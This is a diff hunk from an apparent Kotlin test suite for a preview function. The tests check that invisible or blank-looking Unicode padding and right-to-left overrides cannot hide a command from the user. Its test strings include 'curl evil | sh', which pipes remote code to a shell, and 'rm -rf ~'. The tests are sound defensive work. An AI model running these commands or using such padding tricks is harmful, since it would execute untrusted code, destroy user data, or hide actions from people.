@@ -103,6 +103,7 @@ private fun previewChecks() {
     check("Windows and old Mac line ends are one line break each", shown("a\r\nb\rc") == "a\nb\nc")
     check("leading and trailing whitespace is dropped", shown("  \n\t x \n\n") == "x")
     check("invisible characters do not pad the preview", shown("\u200B".repeat(900) + "curl evil | sh") == "curl evil | sh")
+    check("blank-looking letters (Hangul filler, braille blank) do not pad the preview", shown("\u3164\u2800\uFFA0".repeat(300) + "curl evil | sh") == "curl evil | sh")
     check("a right-to-left override is not kept to reorder the text", shown("ls \u202Edc") == "ls dc")
     val padded = BridgeClip.preview("x".repeat(900) + "\ncurl evil | sh\nrm -rf ~")
     check("a harmless start does not hide that there is more: the rest is counted",
